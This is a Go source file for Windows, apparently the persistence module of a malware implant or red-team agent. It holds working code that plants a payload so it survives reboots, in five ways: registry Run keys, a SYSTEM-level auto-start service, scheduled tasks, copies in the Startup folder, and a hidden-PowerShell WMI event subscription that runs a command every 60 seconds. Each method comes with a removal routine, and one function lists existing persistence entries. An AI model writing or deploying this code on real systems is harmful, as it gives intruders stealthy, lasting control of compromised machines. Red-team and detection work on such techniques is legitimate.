//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	advapi32SC           = windows.NewLazySystemDLL("advapi32.dll")
	procOpenSCManager    = advapi32SC.NewProc("OpenSCManagerW")
	procCreateService    = advapi32SC.NewProc("CreateServiceW")
	procCloseServiceHandle = advapi32SC.NewProc("CloseServiceHandle")
	procDeleteService    = advapi32SC.NewProc("DeleteService")
	procOpenService      = advapi32SC.NewProc("OpenServiceW")
)

const (
	scManagerAllAccess    = 0xF003F
	serviceAllAccess      = 0xF01FF
	serviceWin32OwnProcess = 0x00000010
	serviceAutoStart       = 0x00000002
	serviceErrorNormal     = 0x00000001
)

// persistReg installs a HKCU\Run registry key for current-user persistence.
func persistReg(name, payload string) (string, error) {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE)
	if err != nil {
		return "", fmt.Errorf("RegOpenKey: %v", err)
	}
	defer k.Close()
	if err := k.SetStringValue(name, payload); err != nil {
		return "", fmt.Errorf("RegSetValue: %v", err)
	}
	return fmt.Sprintf("[persist-reg] HKCU\\Run\\%s = %s", name, payload), nil
}

// persistRegRemove removes a HKCU\Run value.
func persistRegRemove(name string) (string, error) {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE)
	if err != nil {
		return "", err
	}
	defer k.Close()
	if err := k.DeleteValue(name); err != nil {
		return "", err
	}
	return fmt.Sprintf("[persist-reg] removed %s", name), nil
}

// persistService installs a Windows service for SYSTEM-level persistence.
func persistService(name, binPath string) (string, error) {
	scmName, _ := windows.UTF16PtrFromString("")
	scmDB, _   := windows.UTF16PtrFromString("ServicesActive")
	hSCM, _, e := procOpenSCManager.Call(
		uintptr(unsafe.Pointer(scmName)),
		uintptr(unsafe.Pointer(scmDB)),
		scManagerAllAccess,
	)
	if hSCM == 0 {
		return "", fmt.Errorf("OpenSCManager: %v", e)
	}
	defer procCloseServiceHandle.Call(hSCM)

	uName, _    := windows.UTF16PtrFromString(name)
	uDisplay, _ := windows.UTF16PtrFromString(name)
	uBin, _     := windows.UTF16PtrFromString(binPath)

	hSvc, _, e := procCreateService.Call(
		hSCM,
		uintptr(unsafe.Pointer(uName)),
		uintptr(unsafe.Pointer(uDisplay)),
		serviceAllAccess,
		serviceWin32OwnProcess,
		serviceAutoStart,
		serviceErrorNormal,
		uintptr(unsafe.Pointer(uBin)),
		0, 0, 0, 0, 0,
	)
	if hSvc == 0 {
		return "", fmt.Errorf("CreateService: %v", e)
	}
	procCloseServiceHandle.Call(hSvc)
	return fmt.Sprintf("[persist-svc] service '%s' installed → %s", name, binPath), nil
}

// persistServiceRemove marks a service for deletion.
func persistServiceRemove(name string) (string, error) {
	scmName, _ := windows.UTF16PtrFromString("")
	scmDB, _   := windows.UTF16PtrFromString("ServicesActive")
	hSCM, _, e := procOpenSCManager.Call(
		uintptr(unsafe.Pointer(scmName)),
		uintptr(unsafe.Pointer(scmDB)),
		scManagerAllAccess,
	)
	if hSCM == 0 {
		return "", fmt.Errorf("OpenSCManager: %v", e)
	}
	defer procCloseServiceHandle.Call(hSCM)

	uName, _ := windows.UTF16PtrFromString(name)
	hSvc, _, e := procOpenService.Call(hSCM, uintptr(unsafe.Pointer(uName)), serviceAllAccess)
	if hSvc == 0 {
		return "", fmt.Errorf("OpenService: %v", e)
	}
	defer procCloseServiceHandle.Call(hSvc)

	r, _, e := procDeleteService.Call(hSvc)
	if r == 0 {
		return "", fmt.Errorf("DeleteService: %v", e)
	}
	return fmt.Sprintf("[persist-svc] service '%s' marked for deletion", name), nil
}

// persistTask creates a scheduled task using schtasks.exe.
// trigger: "ONLOGON" | "ONSTART" | "ONIDLE" | "DAILY" | "HOURLY"
func persistTask(name, cmd, trigger string) (string, error) {
	trigger = strings.ToUpper(trigger)
	if trigger == "" {
		trigger = "ONLOGON"
	}
	args := []string{
		"/create", "/tn", name, "/tr", cmd,
		"/sc", trigger, "/f",
	}
	out, err := exec.Command("schtasks.exe", args...).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("schtasks: %v — %s", err, out)
	}
	return fmt.Sprintf("[persist-task] scheduled task '%s' created (%s)\n%s", name, trigger, strings.TrimSpace(string(out))), nil
}

// persistTaskRemove deletes a scheduled task.
func persistTaskRemove(name string) (string, error) {
	out, err := exec.Command("schtasks.exe", "/delete", "/tn", name, "/f").CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("schtasks delete: %v — %s", err, out)
	}
	return fmt.Sprintf("[persist-task] task '%s' deleted", name), nil
}

// persistStartup copies a file to the current user's Startup folder.
func persistStartup(name, srcPath string) (string, error) {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return "", fmt.Errorf("APPDATA not set")
	}
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	if err := os.MkdirAll(startupDir, 0700); err != nil {
		return "", err
	}
	ext := filepath.Ext(srcPath)
	dst := filepath.Join(startupDir, name+ext)

	data, err := os.ReadFile(srcPath)
	if err != nil {
		return "", fmt.Errorf("read src: %v", err)
	}
	if err := os.WriteFile(dst, data, 0755); err != nil {
		return "", err
	}
	return fmt.Sprintf("[persist-startup] copied to %s", dst), nil
}

// persistStartupRemove deletes a file from the Startup folder.
func persistStartupRemove(name string) (string, error) {
	appData := os.Getenv("APPDATA")
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)

	// Try common extensions
	for _, ext := range []string{".exe", ".bat", ".vbs", ".lnk", ""} {
		p := filepath.Join(startupDir, name+ext)
		if _, err := os.Stat(p); err == nil {
			if err := os.Remove(p); err != nil {
				return "", err
			}
			return fmt.Sprintf("[persist-startup] removed %s", p), nil
		}
	}
	return "", fmt.Errorf("startup entry '%s' not found", name)
}

// persistWMI installs a WMI event subscription for persistent execution.
// Uses MOF-like approach via wmic / powershell.
func persistWMI(name, cmd string) (string, error) {
	// PowerShell WMI event subscription (filter + consumer + binding)
	ps := fmt.Sprintf(`
$FilterArgs = @{
    Name='%s_Filter';
    EventNameSpace='root\CimV2';
    QueryLanguage='WQL';
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\subscription' -Arguments $FilterArgs -ErrorAction Stop

$ConsumerArgs = @{
    Name='%s_Consumer';
    CommandLineTemplate='%s'
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\subscription' -Arguments $ConsumerArgs -ErrorAction Stop

$BindingArgs = @{
    Filter=$Filter;
    Consumer=$Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\subscription' -Arguments $BindingArgs -ErrorAction Stop
Write-Output "WMI persistence installed"
`, name, name, strings.ReplaceAll(cmd, "'", "''"))

	out, err := exec.Command("powershell", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("WMI persist: %v — %s", err, out)
	}
	return fmt.Sprintf("[persist-wmi] '%s' installed (triggers every 60s)\n%s", name, strings.TrimSpace(string(out))), nil
}

// persistWMIRemove removes a WMI event subscription set.
func persistWMIRemove(name string) (string, error) {
	ps := fmt.Sprintf(`
Get-WmiObject __EventFilter -Namespace 'root\subscription' -Filter "Name='%s_Filter'" | Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace 'root\subscription' -Filter "Name='%s_Consumer'" | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace 'root\subscription' | Where-Object { $_.Filter -match '%s_Filter' } | Remove-WmiObject
Write-Output "WMI persistence removed"
`, name, name, name)

	out, err := exec.Command("powershell", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("WMI remove: %v — %s", err, out)
	}
	return fmt.Sprintf("[persist-wmi] '%s' removed\n%s", name, strings.TrimSpace(string(out))), nil
}

// persistList enumerates known persistence locations on this host.
func persistList() (string, error) {
	var sb strings.Builder

	// Registry Run keys
	sb.WriteString("=== Registry Run Keys ===\n")
	for _, root := range []registry.Key{registry.CURRENT_USER, registry.LOCAL_MACHINE} {
		rootName := "HKCU"
		if root == registry.LOCAL_MACHINE {
			rootName = "HKLM"
		}
		k, err := registry.OpenKey(root,
			`Software\Microsoft\Windows\CurrentVersion\Run`,
			registry.QUERY_VALUE)
		if err != nil {
			continue
		}
		names, _ := k.ReadValueNames(0)
		for _, n := range names {
			v, _, _ := k.GetStringValue(n)
			sb.WriteString(fmt.Sprintf("  [%s\\Run] %s = %s\n", rootName, n, v))
		}
		k.Close()
	}

	// Scheduled tasks (abbreviated)
	sb.WriteString("\n=== Scheduled Tasks ===\n")
	out, err := exec.Command("schtasks", "/query", "/fo", "CSV", "/nh").Output()
	if err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			parts := strings.SplitN(line, ",", 2)
			if len(parts) > 0 {
				sb.WriteString(fmt.Sprintf("  %s\n", strings.Trim(parts[0], `"`)))
			}
		}
	}

	// Services (auto-start, non-Microsoft path)
	sb.WriteString("\n=== Auto-Start Services (non-system path) ===\n")
	svcOut, err := exec.Command("powershell", "-NonInteractive", "-Command",
		`Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq 'Auto' -and $_.PathName -notlike '*system32*' -and $_.PathName -notlike '*SysWOW64*'} | ForEach-Object {"  [svc] $($_.Name): $($_.PathName)"}`).Output()
	if err == nil {
		sb.WriteString(string(svcOut))
	}

	// Startup folder
	sb.WriteString("\n=== Startup Folder ===\n")
	appData := os.Getenv("APPDATA")
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	entries, _ := os.ReadDir(startupDir)
	for _, e := range entries {
		sb.WriteString(fmt.Sprintf("  %s\n", e.Name()))
	}

	return sb.String(), nil
}
